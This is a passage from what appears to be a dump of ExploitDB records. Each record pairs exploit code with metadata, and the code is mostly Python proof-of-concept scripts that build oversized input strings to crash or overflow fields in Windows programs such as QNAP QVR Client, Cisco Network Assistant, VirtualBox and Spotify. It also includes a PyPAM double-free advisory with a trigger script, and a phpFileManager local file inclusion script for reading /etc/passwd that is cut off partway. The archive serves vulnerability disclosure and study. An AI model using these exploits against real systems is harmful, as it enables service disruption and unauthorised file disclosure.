Date: 2018-07-26\r\n# 
Vendor Homepage: https://www.qnapsecurity.com/n/en/\r\n# Software Link : http://download.qnap.com/Surveillance/QVRClient/Qmon_5.1.1.30070.zip\r\n# Tested Version: 5.1.1.30070\r\n# Vulnerability Type:   Denial of Service (DoS) Local\r\n# Tested on OS:      
   Windows 10 Pro x64 es\r\n\r\n# Steps to Produce the Crash: \r\n# 1.- Run python code : python QNap_QVR_Client_5.1.1.30070.py\r\n# 2.- Open QNap_QVR_Client_5.1.1.30070.txt and copy content to clipboard\r\n# 3.- Open QVR.exe\r\n# 4.- Direccion IP/Puerto -> 10.10.10.1 / 80\r\n# 5.- Username -> admin\r\n# 6.- Paste ClipBoard on Password\r\n# 7.- OK\r\n# 8.- Crashed\r\n\r\n#!/usr/bin/env python\r\n\r\nbuffer = \"\\x41\" * 279\r\nf = open (\"QNap_QVR_Client_5.1.1.30070.txt\", \"w\")\r\nf.write(buffer)\r\nf.close()", "description": "QNap QVR Client 5.1.1.30070 - 'Password' Denial of Service (PoC)", "author": "Luis Mart\u00ednez", "_id": 45092, "source": "ExploitDB", "platform": "windows", "date": "2018-07-27T00:00:00+00:00", "cve": [], "type": "dos", "port": 0}, {"code": "# Exploit Title: Switch Port Mapping Tool 2.81 - 'SNMP Community Name' Denial of Service (PoC)\r\n# Discovery by: Luis Martinez\r\n# Discovery Date: 2018-07-27\r\n# Vendor Homepage: https://switchportmapper.com/\r\n# Software Link : http://download.switchportmapper.com/spm281.zip\r\n# Tested Version: 2.81\r\n# Vulnerability Type: Denial of Service (DoS) Local\r\n# Tested on OS: Windows 10 Pro x64 es\r\n\r\n# Steps to Produce the Crash: \r\n# 1.- Run python code : python Managed_Switch_Port_Mapping_Tool_2.81.py\r\n# 2.- Open Managed_Switch_Port_Mapping_Tool_2.81.txt and copy content to clipboard\r\n# 3.- Open spmap.exe\r\n# 4.- Switch Group > Settings\r\n# 6.- Paste ClipBoard on \"SNMP v1/v2c Read Community Name\"\r\n# 7.- OK\r\n# 8.- Crashed\r\n\r\n#!/usr/bin/env python\r\n \r\nbuffer = \"\\x41\" * 564\r\nf = open (\"Managed_Switch_Port_Mapping_Tool_2.81.txt\", \"w\")\r\nf.write(buffer)\r\nf.close()", "description": "Switch Port Mapping Tool 2.81 - 'SNMP Community Name' Denial of Service (PoC)", "author": "Luis Mart\u00ednez", "_id": 45112, "source": "ExploitDB", "platform": "windows", "date": "2018-07-31T00:00:00+00:00", "cve": [], "type": "dos", "port": 0}, {"code": "# Exploit Title : QNap QVR Client 5.0.3.23100 - Denial of Service (PoC)\r\n# Discovery by  : Rodrigo Eduardo Rodriguez\r\n# Discovery Date    : 2018-08-06\r\n# Vendor Homepage: http://www.qnapsecurity.com/n/en/\r\n# Software Link : http://download.qnap.com/Surveillance/Utility/QNewMon5.zip\r\n# Tested Version    : 5.0.3.23100\r\n# Vulnerability Type    : Denial of Service (DoS) Local\r\n# Tested on OS  : Windows 10 Pro x64 es\r\n\r\n# Steps to Produce the Crash: \r\n# 1.- Run python code : python generatepaste.py\r\n# 2.- Open generate.txt and copy content to clipboard\r\n# 3.- Open QVR Client\r\n# 4.- Direccion IP/Puerto -> 0.0.0.0 / 80\r\n# 5.- Paste ClipBoard on \"Nombre de Usuario\" and \"contrase\u00f1a\"\r\n# 6.- Aceptar\r\n# 7.- Crashed\r\n\r\n#!/usr/bin/env python\r\n# -*- coding: utf-8 -*-\r\nbuffer = \"\\x41\" * 128\r\nf = open (\"generate.txt\", \"w\")\r\nf.write(buffer)\r\nf.close()", "description": "QNap QVR Client 5.0.3.23100 - Denial of Service (PoC)", "author": "Rodrigo Eduardo Rodriguez", "_id": 45162, "source": "ExploitDB", "platform": "windows_x86-64", "date": "2018-08-07T00:00:00+00:00", "cve": [], "type": "dos", "port": 0}, {"code": "# Exploit Title : Acunetix Web Vulnerability Scanner 10.0 Build 20150623 - Denial of Service (PoC)\r\n# Discovery by: Javier Enrique Rodriguez Gutierrez\r\n# Discovery Date    : 2018-08-11\r\n# Vendor Homepage: https://www.acunetix.com\r\n# Tested Version    : 10.0\r\n# Vulnerability Type    : Denial of Service (PoC)\r\n# Tested on OS  : Windows 10 PRO x86 en\r\n  \r\n\r\n# 1 . run python code : python generate.py\r\n# 2 . open generate.txt and copy content to clipboard\r\n# 3 . open \"Acunetix Web Vulnerability Scanner 10.0\"\r\n# 4 . from Tools Explorer --> subdomain scanner\r\n# 5 . Paste ClipBoard on \"Domain\"\r\n# 6 . Click start\r\n# 7 . Crashed\r\n \r\n#!/usr/bin/env python\r\n# -*- 
coding: utf-8 -*-\r\nbuffer = \"\\x41\" * 2769\r\nf = open (\"generate.txt\", \"w\")\r\nf.write(buffer)\r\nf.close()", "description": "Acunetix WVS 10.0 Build 20150623 - Denial of Service (PoC)", "author": "Javier Enrique Rodriguez Gutierrez", "_id": 45186, "source": "ExploitDB", "platform": "windows", "date": "2018-08-13T00:00:00+00:00", "cve": [], "type": "dos", "port": 0}, {"code": "# Exploit Title: Cisco Network Assistant 6.3.3 - 'Cisco Login' Denial of Service (PoC)\r\n# Discovery by: Luis Martinez\r\n# Discovery Date: 2018-08-27\r\n# Vendor Homepage: https://www.cisco.com/\r\n# Software Link : https://software.cisco.com/download/home/286277276/type/280775097/release/6.3.3\r\n# Tested Version: 6.3.3\r\n# Vulnerability Type: Denial of Service (DoS) Local\r\n# Tested on OS: Windows 10 Pro x64 es\r\n\r\n# Steps to Produce the Crash: \r\n# 1.- Run python code : python Cisco_Network_Assistant_6.3.3.py\r\n# 2.- Open Cisco_Network_Assistant_6.3.3.txt and copy content to clipboard\r\n# 3.- Open Cisco Network Assistant\r\n# 4.- Authenticate to Cisco CCO\r\n# 5.- Paste ClipBoard on \"Cisco Login\"\r\n# 6.- Crashed\r\n\r\n#!/usr/bin/env python\r\n \r\nbuffer = \"\\x41\" * 6900000\r\nf = open (\"Cisco_Network_Assistant_6.3.3.txt\", \"w\")\r\nf.write(buffer)\r\nf.close()", "description": "Cisco Network Assistant 6.3.3 - 'Cisco Login' Denial of Service (PoC)", "author": "Luis Mart\u00ednez", "_id": 45275, "source": "ExploitDB", "platform": "windows", "date": "2018-08-28T00:00:00+00:00", "cve": [], "type": "dos", "port": 0}, {"code": "# Exploit Title: Oracle VirtualBox Manager 5.2.18 r124319  - 'Name Attribute' Denial of Service (PoC)\r\n# Discovery by: Jose Eduardo Castro\r\n# Discovery Date: 2018-09-14\r\n# Vendor Homepage: https://www.virtualbox.org/\r\n# Software Link: https://download.virtualbox.org/virtualbox/5.2.18/VirtualBox-5.2.18-124319-Win.exe\r\n# Tested Version: 5.2.18 r124319\r\n# Tested on OS  : Windows 7 Ultimate x64 es\r\n \r\n#!/usr/bin/env python\r\n#-*-coding: utf-8-*-\r\n# Steps to Produce the DoS: \r\n# 1.- Run python code : python vb_dos.py\r\n# 2.- Open string.txt and copy content to clipboard\r\n# 3.- Open VM VirtualBox Manager\r\n# 4.- Select a created virtual machine in mode \"power off\" and select \"Settings\"\r\n# 5.- Select \"Storage\" button\r\n# 6.- Select option \"Adds new storage controller\" and select any controller\r\n# 7.- Paste ClipBoard on \"Name\"\r\n# 8.- Clic OK\r\n# 9.- DoS\r\n \r\nimport socket, os, sys\r\n \r\nbuffer = \"\\x41\" * 5000\r\n \r\nf = open (\"string.txt\", \"w\")\r\nf.write(buffer)\r\nf.close()", "description": "Oracle VirtualBox Manager 5.2.18 r124319 - 'Name Attribute' Denial of Service (PoC)", "author": "Jose Eduardo Castro", "_id": 45421, "source": "ExploitDB", "platform": "windows_x86-64", "date": "2018-09-17T00:00:00+00:00", "cve": [], "type": "dos", "port": 0}, {"code": "# Exploit Title: Navicat 12.0.29 - 'SSH' Denial of Service (PoC)\r\n# Author: Rafael Alfaro\r\n# Discovery Date: 2018-10-27\r\n# Vendor Homepage: https://www.navicat.com/es/\r\n# Software Link 
: https://www.navicat.com/es/download/navicat-premium\r\n# Vulnerability Type: Denial of Service (DoS) Local\r\n# Tested on OS: 
Windows 7 x64 en, Windows 10 Home x64 es\r\n\r\n# Steps to Produce the Crash:\r\n# 1.- Run python code : python Navicat-SSH.py\r\n# 2.- Open navicat.txt and copy content to clipboard\r\n# 3.- Open navicat.exe\r\n# 4.- Click \"Conexion\" and select \"MySQL...\"\r\n# 5.- In the \"General\" tab, give a name to the connection in \"Nombre de Conexion\" (i. e. conexion1).\r\n# 6.- In the \"SSH\" tab check \"Uso de tunel SSH\", then set and IP address to the \"Host\" textbox (i. e. 127.0.0.1) and write down a username in \"Nombre de usuario\" (i. e. admin).\r\n# 7.- Be sure that \"Metodo de autentificacion\" is set to \"Contrasena\" and finally paste Clipboard in \"Contrasena\".\r\n# 8.- Click \"Aceptar\".\r\n# 9.- Crashed!\r\n\r\n# !/usr/bin/env python Navicat-SSH.py\r\n\r\nbuffer = \"\\x41\" * 5000\r\nf = open(\"navicat.txt\", \"w\")\r\nf.write(buffer)\r\nf.close()", "description": "Navicat 12.0.29 - 'SSH' Denial of Service (PoC)", "author": "Rafael Alfaro", "_id": 45705, "source": "ExploitDB", "platform": "windows_x86-64", "date": "2018-10-29T00:00:00+00:00", "cve": [], "type": "dos", "port": 0}, {"code": "# Exploit Title: Advanced Host Monitor 11.90 Beta - 'Registration number' Denial of Service (PoC)\r\n# Discovery by: Luis Martinez\r\n# Discovery Date: 2019-01-30\r\n# Vendor Homepage: https://www.ks-soft.net\r\n# Software Link : https://www.ks-soft.net/download/hm1190.exe\r\n# Tested Version: 11.90 Beta\r\n# Vulnerability Type: Denial of Service (DoS) Local\r\n# Tested on OS: Windows 10 Pro x64 es\r\n\r\n# Steps to Produce the Crash: \r\n# 1.- Run python code : python Advanced_Host_Monitor_11.90_Beta.py\r\n# 2.- Open Advanced_Host_Monitor_11.90_Beta.txt and copy content to clipboard\r\n# 3.- Open HostMonitor\r\n# 4.- Help -> License...\r\n# 5.- Register Now\r\n# 
6.- Name (Organization): -> l4m5\r\n# 7.- Paste ClipBoard on \"Registration number:\"\r\n# 8.- OK\r\n# 9.- Crashed\r\n\r\n#!/usr/bin/env python\r\n \r\nbuffer = \"\\x41\" * 1050\r\nf = open (\"Advanced_Host_Monitor_11.90_Beta.txt\", \"w\")\r\nf.write(buffer)\r\nf.close()", "description": "Advanced Host Monitor 11.90 Beta - 'Registration number' Denial of Service (PoC)", "author": "Luis Mart\u00ednez", "_id": 46291, "source": "ExploitDB", "platform": "windows", "date": "2019-01-31T00:00:00+00:00", "cve": [], "type": "dos", "port": 0}, {"code": "# Exploit Title: iSmartViewPro 1.5 - 'Account' Buffer Overflow\r\n# Discovery by: Alan Joaqu\u00edn Baeza Meza\r\n# Discovery Date: 2018-08-07\r\n# Vendor Homepage: http://www.securimport.com/n/en/\r\n# Software Link: 
https://securimport.com/university/index.php/videovigilancia-ip/software/493-software-ismartviewpro-v1-5\r\n# Tested Version: 1.5\r\n# Tested on OS  : Windows 10 Pro x64 es\r\n\r\n# Steps to Produce the BoF: \r\n# 1.- Run python code : python generatepaste.py\r\n# 2.- Open generate.txt and copy content to clipboard\r\n# 3.- Open iSmartViewPro\r\n# 4.- Add device manually\r\n# 5.- Device alias -> A\r\n# 6.- Device Type-> SmartP2P\r\n# 7.- DDNS/IP/DID-> 0.0.0.0\r\n# 8.- Paste ClipBoard on \"Account\"\r\n# 9.- Password -> A\r\n#10.- Aceptar\r\n#11.- BoF\r\n\r\n#!/usr/bin/env python\r\n# -*- coding: utf-8 -*-\r\nbuffer = \"\\x41\" * 479\r\neip= \"\\x42\" * 4\r\nf = open (\"generate.txt\", \"w\")\r\nf.write(buffer+eip)\r\nf.close()", "description": "iSmartViewPro 1.5 - 'Account' Buffer Overflow", "author": "Alan Joaqu\u00edn Baeza Meza", "_id": 45166, "source": "ExploitDB", "platform": "windows_x86-64", "date": "2018-08-08T00:00:00+00:00", "cve": [], "type": "local", "port": 0}, {"code": "#!/usr/bin/env python\r\n# -*- coding: utf-8 -*-\r\n# Exploit Title\u00a0\u00a0\u00a0\u00a0 : SuperScan 4.1 Tools Hostname/IP/URL Field Buffer Overflow Crash PoC\r\n# Discovery by\u00a0\u00a0\u00a0\u00a0\u00a0 : Luis Mart\u00ednez\r\n# Email\t\t    : l4m5@hotmail.com\r\n# Discovery Date\u00a0\u00a0\u00a0 : 18/11/2015\r\n# Vendor Homepage\u00a0\u00a0 : http://www.foundstone.com\r\n# Software Link\u00a0\u00a0\u00a0\u00a0 : http://www.mcafee.com/us/downloads/free-tools/superscan.aspx\r\n# Tested Version\u00a0\u00a0\u00a0 : 4.1\r\n# Vulnerability Type\u00a0\u00a0\u00a0 : Denial of Service (DoS) Local\r\n# Tested on OS\u00a0\u00a0\u00a0\u00a0\u00a0 : Windows XP 
Professional SP3 x86 es\r\n# Steps to Produce the Crash: \r\n# 1.- Run python code : python super_scan_4.1_tools.py\r\n# 2.- Open super_scan_4.1_tools.txt and copy content to clipboard\r\n# 3.- Open SuperScan4.1.exe\r\n# 4.- Paste Clipboard Tools > Hostname/IP/URL\r\n# 5.- Clic on button -> Whois\r\n# 6.- Crashed\r\n\r\nbuffer = \"\\x41\" * 280\r\neip = \"\\x42\" * 4\r\n\r\nf = open (\"super_scan_4.1_tools.txt\", \"w\")\r\nf.write(buffer + eip)\r\nf.close()", "description": "SuperScan 4.1 - Tools Hostname/IP/URL Field Buffer Overflow", "author": "Luis Mart\u00ednez", "_id": 38759, "source": "ExploitDB", "platform": "windows", "date": "2015-11-19T00:00:00+00:00", "cve": [], "type": "dos", "port": 0}, {"code": "#!/usr/bin/env python\r\n# -*- coding: utf-8 -*-\r\n# Exploit Title     : SNScan v1.05 Scan Hostname/IP Field Buffer Overflow Crash PoC\r\n# Discovery by      : Daniel Velazquez\r\n# Email         : ingenierovelazquez@hotmail.com\r\n# Discovery Date    : 12/01/2016\r\n# Vendor Homepage   : http://www.foundstone.com\r\n# Software Link     : http://www.mcafee.com/us/downloads/free-tools/snscan.aspx\r\n# Tested Version    : 1.05\r\n# Vulnerability Type    : Denial of Service (DoS) Local\r\n# Tested on OS      : Windows 8 x86 es\r\n# Steps to Produce the Crash: \r\n# 1.- Run python code : python SNScan-v1.05.py\r\n# 2.- Open SNScan-v1.05.txt and copy content to clipboard\r\n# 3.- Open SNScan.exe\r\n# 4.- Clic button Ok\r\n# 5.- Paste Clipboard Scan > Hostname/IP\r\n# 6.- Clic on add button (->)\r\n# 7.- Clic button Aceptar\r\n# 8.- Crashed\r\n \r\nbuffer = \"\\x41\" * 388\r\neip = \"\\x42\" * 4\r\n \r\nf = open (\"SNScan-v1.05.txt\", \"w\")\r\nf.write(buffer + eip)\r\nf.close()", "description": "SNScan 1.05 - Scan Hostname/IP Field Buffer Overflow Crash (PoC)", "author": "Daniel Velazquez", "_id": 39226, "source": "ExploitDB", "platform": "windows", "date": "2016-01-12T00:00:00+00:00", 
"cve": [], "type": "dos", "port": 0}, {"code": "# Exploit Title: NetScanTools Basic Edition 2.5 - 'Hostname' Denial of Service (PoC)\r\n# Discovery by: Luis Mart\u00ednez\r\n# Discovery Date: 2018-07-26\r\n# Vendor Homepage: https://www.netscantools.com/\r\n# Software Link : http://download.netscantools.com/nstb250.zip\r\n# Tested Version: 2.5\r\n# Vulnerability Type: Denial of Service (DoS) Local\r\n# Tested on OS: Windows 10 Pro x64 es\r\n\r\n# Steps to Produce the Crash: \r\n# 1.- Run python code : python NetScanTools_Basic_Edition_2.5.py\r\n# 2.- Open NetScanTools_Basic_Edition_2.5.txt and copy content to clipboard\r\n# 3.- Open NstBasic.exe\r\n# 4.- Ping and Traceroute Tools\r\n# 5.- Ping\r\n# 6.- Paste ClipBoard on Target Hostname or IPv4 Address\r\n# 
7.- Do Ping\r\n# 8.- Crashed\r\n\r\n#!/usr/bin/env python\r\n \r\nbuffer = \"\\x41\" * 1125\r\nf = open (\"NetScanTools_Basic_Edition_2.5.txt\", \"w\")\r\nf.write(buffer)\r\nf.close()", "description": "NetScanTools Basic Edition 2.5 - 'Hostname' Denial of 
Service (PoC)", "author": "Luis Mart\u00ednez", "_id": 45095, "source": "ExploitDB", "platform": "windows", "date": "2018-07-27T00:00:00+00:00", "cve": [], "type": "dos", "port": 0}, {"code": "#!/usr/bin/env python\r\n# -*- coding: utf-8 -*-\r\n#\r\n# Exploit Title\t: CIScanv1.00 Hostname/IP Field Local BoF PoC\r\n# Discovery by  \t: Irving Aguilar\r\n# Email\t\t: im.aguilar@protonmail.ch\r\n# Discovery Date\t: 05.05.2016\r\n# Software Link \t: http://www.mcafee.com/us/downloads/free-tools/ciscan.aspx#\r\n# Tested Version\t: 1.00\r\n# Vulnerability Type\t: Denial of Service (DoS) Local\r\n# Tested on OS\t\t: Windows 7 Enterprise SP1 x64 en\r\n#\r\n#\r\n# Steps to Produce the Crash:\r\n# 1.- Run python code : python CIScanv1-BoF.py\r\n# 2.- Open CIScanv1-BoF.txt and copy content to clipboard\r\n# 3.- Open CIScan.exe\r\n# 4.- Clic button Ok\r\n# 5.- Paste Clipboard Scan > Hostname/IP\r\n# 6.- Clic on add button (->)\r\n# 7.- Clic button Aceptar\r\n# 8.- Crashed\r\n\r\nbuffer = \"\\x41\" * 388\r\neip = \"\\x42\" * 4\r\n\r\nf = open (\"CIScanv1-BoF.txt\", \"w\")\r\nf.write(buffer + eip)\r\nf.close()", "description": "CIScan 1.00 - Hostname/IP Field Crash (PoC)", "author": "Irving Aguilar", "_id": 39776, "source": "ExploitDB", "platform": "windows", "date": "2016-05-06T00:00:00+00:00", "cve": [], "type": "dos", "port": 0}, {"code": "# Exploit Title: Spotify 1.0.96.181 - \"Proxy configuration\"  Denial of Service (PoC)\r\n# Discovery by: Aaron V. Hernandez\r\n# Discovery Date: 2019-01-15\r\n# Vendor Homepage: https://www.spotify.com\r\n# Software Link: https://www.spotify.com/mx/download/windows/\r\n# Tested Version: 1.0.96.181\r\n# Vulnerability Type: Denial of Service (DoS) Local\r\n# Tested on OS: Windows 10 Home x64\r\n\r\n# Steps to Produce the Crash:\r\n# 1.- Run python code : python Spotify_1.0.96.181.py\r\n# 2.- Open Spotify_1.0.96.181.txt and copy content to clipboard\r\n# 3.- Open Spotify.exe\r\n# 4.- Clic \"Configuracion\"\r\n# 5.- Select HTTP\r\n# 6.- Paste ClipBoard on \"Host\"\r\n# 7.- Clic \"Actualizar proxy\"\r\n# 8.- Type any user and password\r\n# 9.- \"Iniciar sesion\"\r\n# 10.- Crashed\r\n\r\n# !/usr/bin/env python\r\n\r\nbuffer = \"\\x41\" * 516544\r\nf = open(\"Spotify_1.0.96.181.txt\", \"w\")\r\nf.write(buffer)\r\nf.close()", "description": "Spotify 1.0.96.181 - 'Proxy configuration' Denial of Service (PoC)", "author": "Aaron V. Hernandez", "_id": 46170, "source": "ExploitDB", "platform": "windows", "date": "2019-01-16T00:00:00+00:00", "cve": [], "type": "dos", "port": 0}, {"code": "# Exploit Title: iSmartViewPro 1.5 - 'Device Alias' Buffer Overflow\r\n# Author: Rodrigo Eduardo Rodriguez\r\n# Discovery Date: 2018-08-07\r\n# Vendor Homepage: https://securimport.com/\r\n# Software Link: https://securimport.com/university/videovigilancia-ip/software/493-software-ismartviewpro-v1-5\r\n# Tested Version: 1.5\r\n# Vulnerability Type: Buffer Overflow Local\r\n# Tested on OS: Windows 10 Pro x64 es\r\n \r\n# Steps to Produce the BoF: \r\n# 1.- Run python code : python generatepaste.py\r\n# 2.- Open generate.txt and copy content to clipboard\r\n# 3.- Open iSmartViewPro\r\n# 4.- clic button \"+\"\r\n# 5.- Select \"add device manually\"\r\n# 6.- paste ClipBoard on \"Device Alias\"\r\n# 7.- DNS/IP/DID -> \"0.0.0.0\"\r\n# 8.- acount -> \"admin\"\r\n# 9.- password -> \"admin\"\r\n# 10.- Save\r\n# 11.- BoF\r\n \r\n#!/usr/bin/env python\r\n# -*- coding: utf-8 -*-\r\nbuffer = \"\\x41\" * 415\r\neip = \"\\x42\" * 4\r\nf = open (\"generate.txt\", \"w\")\r\nf.write(buffer + eip)\r\nf.close()", "description": "iSmartViewPro 
1.5 - 'Device Alias' Buffer Overflow", "author": "Rodrigo Eduardo Rodriguez", "_id": 45165, "source": "ExploitDB", "platform": "windows_x86-64", "date": "2018-08-08T00:00:00+00:00", "cve": [], "type": "local", "port": 0}, {"code": "#!/\u2060usr/\u2060bin/\u2060env python\r\n# Title : Internet Download Manager -\u2060 Crash Proof Of Concept\r\n# Affected Versions: All Version\r\n# Founder : InternetDownloadManager\r\n# Tested on Windows 7 /\u2060 Server 2008\r\n#\r\n#\r\n# Author      :   Mohammad Reza Espargham\r\n# Linkedin    :   https://ir.linkedin.com/in/rezasp\r\n# E-\u2060Mail      :   me[at]reza[dot]es , reza.espargham[at]gmail[dot]com\r\n# Website     :   www.reza.es\r\n# Twitter     :   https://twitter.com/rezesp\r\n# FaceBook    :   https://www.facebook.com/mohammadreza.espargham\r\n#\r\n#\r\n# downlWithIDM64.dll Exploit\r\n#\r\n#\r\n# 1 . run python code : python crash.py\r\n# 2 . open r3z4.txt and copy content to clipboard\r\n# 3 . open \"IDM\"\r\n# 4 . From Menu , Downloads -\u2060-\u2060> Find\r\n# 5 . Paste ClipBoard on \"File name or part of the name\"\r\n# 6 . Click Find\r\n# 7 . Crashed ;)\r\n\r\n\r\ncrash = \"\\x41\"*10000 #B0F\r\nfile = open(\"r3z4.txt\", \"w\")\r\nfile.write(crash)\r\nfile.close()", "description": "Internet Download Manager - Find Download Crash (PoC)", "author": "Mohammad Reza Espargham", "_id": 37608, "source": "ExploitDB", "platform": "windows", "date": "2015-07-14T00:00:00+00:00", "cve": [], "type": "dos", "port": 0}, {"code": "# Exploit Title: Foscam Video Management System 1.1.4.9 - 'Username' Denial of Service (PoC)\r\n# Discovery by: Luis Martinez\r\n# Discovery Date: 2019-01-04\r\n# Vendor 
Homepage: https://www.foscam.es/\r\n# Software Link : https://www.foscam.es/descarga/FoscamVMS_1.1.4.9.zip\r\n# Tested Version: 
1.1.4.9\r\n# Vulnerability Type: Denial of Service (DoS) Local\r\n# Tested on OS: Windows 10 Pro x64 es\r\n\r\n# Steps to Produce the Crash: \r\n# 1.- Run python code : python FoscamVMS_1.1.4.9.py\r\n# 2.- Open FoscamVMS_1.1.4.9.txt and copy content to clipboard\r\n# 3.- Open FoscamVMS\r\n# 4.- User Name -> admin\r\n# 5.- Password ->\r\n# 6.- Login\r\n# 7.- System Settings\r\n# 8.- User Management Settings\r\n# 9.- Add\r\n# 10.- Paste ClipBoard on \"Username\"\r\n# 11.- Password -> P4ssw0rd\r\n# 12.- Save\r\n# 13.- Crashed\r\n\r\n#!/usr/bin/env python\r\n \r\nbuffer = \"\\x41\" * 150\r\nf = open (\"FoscamVMS_1.1.4.9.txt\", \"w\")\r\nf.write(buffer)\r\nf.close()", "description": "Foscam Video Management System 1.1.4.9 - 'Username' Denial of Service (PoC)", "author": "Luis Mart\u00ednez", "_id": 46089, "source": "ExploitDB", "platform": "windows", "date": "2019-01-07T00:00:00+00:00", "cve": [], "type": "dos", "port": 0}, {"code": "# Exploit Title: AgataSoft Auto PingMaster 1.5 - 'Host name' Denial of Service (PoC)\r\n# Discovery by: Luis Martinez\r\n# Discovery Date: 2018-08-02\r\n# Vendor Homepage: http://agatasoft.com/\r\n# Software Link : http://agatasoft.com/Ping_Master.exe\r\n# Tested Version: 1.5\r\n# Vulnerability Type: Denial of Service (DoS) Local\r\n# 
Tested on OS: Windows 10 Pro x64 es\r\n\r\n# Steps to Produce the Crash: \r\n# 1.- Run python code : python AgataSoft_Auto_PingMaster_1.5.py\r\n# 2.- Open AgataSoft_Auto_PingMaster_1.5.txt and copy content to clipboard\r\n# 3.- Open Ping_Master.exe\r\n# 4.- Trace Route\r\n# 5.- Paste ClipBoard on \"Host name:\"\r\n# 6.- Get IP from host name\r\n# 7.- Crashed\r\n\r\n#!/usr/bin/env python\r\n \r\nbuffer = \"\\x41\" * 742\r\nf = open (\"AgataSoft_Auto_PingMaster_1.5.txt\", \"w\")\r\nf.write(buffer)\r\nf.close()", "description": "AgataSoft Auto PingMaster 1.5 - 'Host name' Denial of Service (PoC)", "author": "Luis Mart\u00ednez", "_id": 45137, "source": "ExploitDB", "platform": "windows", "date": "2018-08-02T00:00:00+00:00", "cve": [], "type": "local", "port": 0}, {"code": "# !/usr/bin/python\r\n# Exploit Title: aktiv-player version 2.80\r\n# Exploit Author: IndonesiaGokilTeam\r\n# Vendor Homepage: http://www.goforsharing.com/home-mainmenu-1/aktiv-player-mainmenu-131.html\r\n# Tested on: Windows XP SP 3\r\n\r\nsampah= \"\\x42\" * 200\r\nfile = open(\"GOKIL.wma\",\"w\")\r\nfile.write(sampah)\r\nfile.close()\r\n\r\n#salam BLANK SEPARATOS\r\n#thanks to everyone :D\r\n#magelangan cyber ,pohon jati crew, jagad kali kode , bisul heker,", "description": "Aktiv Player 2.80 - Crash (PoC)", "author": "IndonesiaGokilTeam", "_id": 23780, "source": "ExploitDB", "platform": "windows", "date": "2012-12-31T00:00:00+00:00", "cve": [], "type": "dos", "port": 0}, {"code": "=== LSE Leading Security Experts - Security Advisory 2012-03-01 ===\r\n\r\nPyPAM -- Python bindings for PAM - Double Free Corruption\r\n---------------------------------------------------------\r\n\r\nAffected Versions\r\n=================\r\nPyPAM <= 0.4.2\r\nRed Hat PyPAM <= 0.5.0-12\r\nDebian python-pam <= 0.4.2-12.2\r\nUbuntu python-pam <= 0.4.2-12.2\r\nSUSE python-pam <= 0.5.0-79.1.2\r\nGentoo pypam <= 0.5.0\r\n\r\nProblem Overview\r\n================\r\nTechnical Risk: high\r\nLikelihood of Exploit: low to medium\r\nVendor: Rob Riggs, Various\r\nDiscovery: Markus Vervier\r\nAdvisory URL: http://www.lsexperts.de/advisories/lse-2012-03-01.txt\r\nAdvisory Status: Public\r\nCVE-Number: CVE-2012-1502\r\n\r\nProblem Description\r\n===================\r\nWhile conducting an internal test LSE discovered that by supplying\r\na password containing a NULL-byte to the PyPAM module, a double-free [1]\r\ncondition is triggered. This leads to undefined behaviour and may allow\r\nremote code execution.\r\n\r\nTemporary Workaround and Fix\r\n============================\r\nFiltering NULL-bytes in strings before passing them to the PyPAM module\r\nwill mitigate the exploit. Also current GLIBC protections may prevent\r\nthe double-free condition from being exploitable. It is advised to update\r\nto a fixed version of PyPAM.\r\n\r\nDetailed Description\r\n====================\r\nWhen PyArg_ParseTuple() in line 81 of PAMmodule.c is given a string with\r\nNull-Bytes, a TypeError exception is raised [2]. The security problem is in\r\nline 82 of PAMmodule.c where free() is called on *resp, but *resp is not\r\nset to NULL. On line 95 in libpam's v_prompt.c the _pam_drop macro calls\r\nfree on the response again unless (*resp == NULL), which leads to\r\nundefined behaviour.\r\n\r\nThe following PoC script triggers the problem:\r\n\r\n<--snip-->\r\n#!/usr/bin/env python\r\n##\r\n## python-pam 0.4.2 double free PoC\r\n## \r\n## 2012 Leading Security Experts GmbH\r\n## 
Markus Vervier\r\n##\r\n# -*- coding: utf-8 -*-\r\n\r\ndef verify_password(user, password):\r\n    import PAM\r\n    def pam_conv(auth, query_list, userData):\r\n        resp = []\r\n        resp.append( (password, 0))\r\n        return resp\r\n    res = -3\r\n    service = 'passwd'\r\n\r\n    auth = PAM.pam()\r\n    auth.start(service)\r\n    auth.set_item(PAM.PAM_USER, user)\r\n 
   auth.set_item(PAM.PAM_CONV, pam_conv)\r\n    try:\r\n        auth.authenticate()\r\n        auth.acct_mgmt()\r\n    except PAM.error, resp:\r\n        print 'Go away! (%s)' % resp\r\n        res = -1\r\n    except:\r\n        print 'Internal error'\r\n 
       res = -2\r\n    else:\r\n        print 'Good to go!'\r\n        res = 0\r\n\r\n    return res\r\n\r\nprint verify_password(\"root\", \"a\\x00secret\")\r\n<--snip--> \r\n\r\nHistory\r\n=======\r\n2012-03-02  Problem discovery during internal QA\r\n2012-03-05  Original vendor and Debian maintainer contacted\r\n2012-03-06  Public Patch released\r\n2012-03-07  Various maintainers contacted\r\n2012-03-07  CVE-2012-1502 assigned\r\n2012-03-08  LSE learned in that this bug was previously discovered and fixed in rPath Linux [3]\r\n2012-03-08  Coordinated Advisory Release\r\n\r\nReferences\r\n==========\r\n[1] http://cwe.mitre.org/data/definitions/415.html\r\n[2] http://docs.python.org/release/1.5.2p2/ext/parseTuple.html\r\n[3] https://issues.rpath.com/browse/RPL-2773", "description": "PyPAM Python bindings for PAM - Double-Free Corruption", "author": "Markus Vervier", "_id": 18579, "source": "ExploitDB", "platform": "linux", "date": "2012-03-10T00:00:00+00:00", "cve": ["CVE-2012-1502"], "type": "dos", "port": 
0}, {"code": "# Exploit Title: phpFileManager 1.7.8 - Local File Inclusion\r\n# Date: 01.04.2019\r\n# Exploit Author: Murat Kalafatoglu\r\n# Vendor Homepage: https://sourceforge.net/projects/phpfm/\r\n# Software Demo: https://phpfm-demo.000webhostapp.com/\r\n# Version: v1.7.8\r\n# Category: Webapps\r\n# Tested on: XAMPP for Linux\r\n# Description: Any user can read files from the server\r\n# without authentication due to an existing LFI in the following path:\r\n# http://target/index.php?action=3&fm_current_dir=%2Fetc%2F&filename=passwd\r\n\r\n# PoC\r\n\r\n#!/usr/bin/python\r\n\r\nimport requests, sys\r\n\r\nprint \"\\n[*] phpFileManager 1.7.8 LFI PoC By Murat Kalafatoglu\"\r\nprint \"[+] usage: python \" + __file__ + \" http://<target_ip/domain>\"\r\nif (len(sys.argv) != 2):\r\n    print \"[*] Usage: poc.py <target_ip/domain>\"\r\n    exit(0)\r\nip_add = sys.argv[1]\r\n\r\ndr = raw_input('[+] Directory: aka /etc/\\n')\r\nfd = raw_input('[+] File : aka passwd\\n')\r\n\r\nprint \"Exploiting.....\"\r\nprint '\\n'\r\n\r\nexp = requests.get(\"\"+ 